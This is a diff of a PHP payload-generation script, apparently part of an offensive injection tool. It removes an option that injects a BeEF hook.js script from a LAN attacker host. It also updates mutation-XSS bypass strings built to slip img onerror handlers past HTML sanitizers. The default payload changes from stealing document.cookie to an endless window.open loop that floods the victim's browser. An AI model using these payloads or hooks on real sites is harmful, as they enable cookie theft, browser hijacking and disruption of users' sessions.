@@ -31,12 +31,9 @@ if(isset($_COOKIE['file'])){
 //user submit payload
 if(isset($_POST['payload_submit'])){
     $tag = $_POST['element'];
-    if($_POST['inject_option']=='beef'){
-        $payload='<script src="http://192.168.1.18:3000/hook.js" type="text/javascript"></script>';
-    }
 
     //if user choose html injection option as injection
-    else if($_POST['inject_option']=='htmlInj'){
+    if($_POST['inject_option']=='htmlInj'){
         if(!empty($_POST['html_payload'])){
             $bypass1 = '<foreignObject class="node" x="100" y="100" width="400" height="400"><body xmlns="http://www.w3.org./1999/xhtml">';
             $bypass2 = '</body></foreignObject>';
@@ -127,13 +124,13 @@ if(isset($_POST['payload_submit'])){
 
     //if user choose XSS option as injection
     else if($_POST['inject_option']=='xss'){
-        $bypass1 = '<p><form><math><mtext></form><form><mglyph><style></math><img src onerror=\'';
-        $bypass2 = '\'>';
+        $bypass1 = '<p><form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=\'';
+        $bypass2 = '\' src>">';
         if(!empty($_POST['xss_payload'])){
             $payload = $bypass1 . $_POST['xss_payload']. $bypass2;
         }
         else{
-            $payload='<p><form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.cookie) src>">';
+            $payload='<p><form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=\'while(true){window.open("https://www.google.com")}\' src>">';
     
         }
     }
